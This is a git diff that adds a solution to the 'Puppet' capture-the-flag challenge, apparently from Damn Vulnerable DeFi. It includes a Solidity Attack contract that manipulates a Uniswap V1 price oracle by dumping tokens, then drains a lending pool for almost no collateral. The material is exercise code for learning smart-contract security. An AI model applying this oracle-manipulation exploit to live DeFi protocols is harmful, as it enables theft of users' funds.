@@ -92,7 +92,13 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        Attack attacker = new Attack(token, lendingPool, uniswapV1Exchange, recovery);
+
+        // Transfer everything to the contract
+        payable(attacker).transfer(player.balance);
+        token.transfer(address(attacker), token.balanceOf(player));
+
+        attacker.attack();
     }
 
     // Utility function to calculate Uniswap prices
@@ -115,4 +121,32 @@ contract PuppetChallenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+contract Attack {
+    DamnValuableToken token;
+    PuppetPool lendingPool;
+    IUniswapV1Exchange uniswapV1Exchange;
+    address recovery;
+
+    constructor(DamnValuableToken _token, PuppetPool _lendingPool, IUniswapV1Exchange _uniswapV1Exchange, address _recovery) {
+        token = _token;
+        lendingPool = _lendingPool;
+        uniswapV1Exchange = _uniswapV1Exchange;
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        // Swap in a bunch of tokens to drive uniswapPair.balance down and token.balanceOf(uniswapPair) up
+        // so that _computeOraclePrice goes to 0
+        token.approve(address(uniswapV1Exchange), 1000e18);
+        uniswapV1Exchange.tokenToEthSwapInput(
+            1000e18, 
+            uniswapV1Exchange.getTokenToEthInputPrice(1000e18), 
+            block.timestamp * 2
+        );
+        lendingPool.borrow{value: address(this).balance}(100_000e18, recovery);
+    }
+
+    receive() external payable {}
 }
